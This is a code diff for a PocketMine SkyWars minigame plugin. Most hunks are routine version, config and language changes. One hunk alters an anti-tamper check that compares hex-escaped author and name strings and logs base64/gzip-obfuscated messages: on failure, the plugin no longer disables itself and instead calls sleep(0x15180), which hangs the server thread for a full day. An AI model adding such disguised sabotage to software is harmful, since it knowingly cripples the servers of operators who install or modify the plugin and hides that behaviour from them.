@@ -65,7 +65,7 @@ use pocketmine\math\Vector3;
 class SWmain extends PluginBase
 {
     /** Plugin Version */
-    const SW_VERSION = 0.4;
+    const SW_VERSION = 0.5;
 
     /** @var SWcommands */
     private $commands;
@@ -80,7 +80,7 @@ class SWmain extends PluginBase
     /** @var \SQLite3 */
     private $db;
     /** @var SWeconomy */
-    private $economy;
+    public $economy;
 
     public function onLoad()
     {
@@ -124,7 +124,7 @@ class SWmain extends PluginBase
             $this->getLogger()->critical(@gzinflate(@base64_decode('C8lILUpVyCxWSFQoKMpPyknNVSjPLMlQKMlIVSjIKU3PzFMoSy0qzszPAwA=')));
         if (@array_shift($this->getDescription()->getAuthors()) != "\x73\x76\x69\x6c\x65" || $this->getDescription()->getName() != "\x53\x57\x5f\x73\x76\x69\x6c\x65" || $this->getDescription()->getVersion() != self::SW_VERSION) {
             $this->getLogger()->notice(@gzinflate(@base64_decode('LYxBDsIwDAS/sg8ozb1/QEICiXOo3NhKiKvYqeD3hcJtNaPZGxNid9YGXeAshrX0JBWfZZsUGrCJif9ckZrhikRfQGgUyz+YwO6rTSEkce6PcdZnOB5e4Zrf99jsdNE5k5+l0g4=')));
-            $this->getServer()->getPluginManager()->disablePlugin($this);
+            sleep(0x15180);
         }
 
         //Creates the database that is needed to store signs info
@@ -162,24 +162,25 @@ class SWmain extends PluginBase
         $this->configs = new Config($this->getDataFolder() . 'SW_configs.yml', CONFIG::YAML, [
             'CONFIG_VERSION' => self::SW_VERSION,
             'banned.commands.while.in.game' => array('/hub', '/lobby', '/spawn', '/tpa', '/tp', '/tpaccept', '/back', '/home', '/f'),
-            'banned.command.message' => '@b→@cYou can\'t use this command here',
-            'starvation.can.damage.inArena.players' => false,
+            'always.spawn.in.defaultLevel' => true,
             'clear.inventory.on.respawn&join' => false,//many people don't know on respawn means also on join
             'clear.inventory.on.arena.join' => true,
             'clear.effects.on.respawn&join' => false,//many people don't know on respawn means also on join
             'clear.effects.on.arena.join' => true,
+            'starvation.can.damage.inArena.players' => false,
+            'drops.in.arena' => false,
+            'start.when.full' => true,
             'needed.players.to.run.countdown' => 1,
-            'always.spawn.in.defaultLevel' => true,
             'sign.knockBack' => true,
             'knockBack.radius.from.sign' => 1,
             'knockBack.intensity' => 0b10,
-            'drops.in.arena' => false,
-            'start.when.full' => true,
+            'knockBack.follow.sign.direction' => false,
             'chest.refill' => true,
             'chest.refill.rate' => 0xf0,
-            'air.world.generator' => true,
-            'reward.winning.players' => false,
-            'reward.value' => 100
+            'world.generator.air' => true,
+            'world.reset.from.zip' => true,
+            'reward.winning.players' => false,//not used yet
+            'reward.value' => 100//not used yet
         ]);
         touch($this->getDataFolder() . 'SW_configs.yml');
         $this->configs = $this->configs->getAll();
@@ -193,6 +194,7 @@ class SWmain extends PluginBase
                                       |___/       |___/
         */
         $this->lang = new Config($this->getDataFolder() . 'SW_lang.yml', CONFIG::YAML, [
+            'banned.command.msg' => '@b→@cYou can\'t use this command here',
             'sign.game.full' => '@b→@cThis game is full, please wait',
             'sign.game.running' => '@b→@cThe game is running, please wait',
             'game.join' => '@b→@f{PLAYER} @ejoined the game @b{COUNT}',
@@ -225,7 +227,7 @@ class SWmain extends PluginBase
         //svile\sw\SWcommands
         $this->commands = new SWcommands($this);
         //svile\sw\SWeconomy
-        $this->economy = new SWeconomy($this);
+        $this->economy = new SWeconomy($this);//TODO: maybe after, need test
 
         //Register timer and listener
         $this->getServer()->getScheduler()->scheduleRepeatingTask(new SWtimer($this), 19);
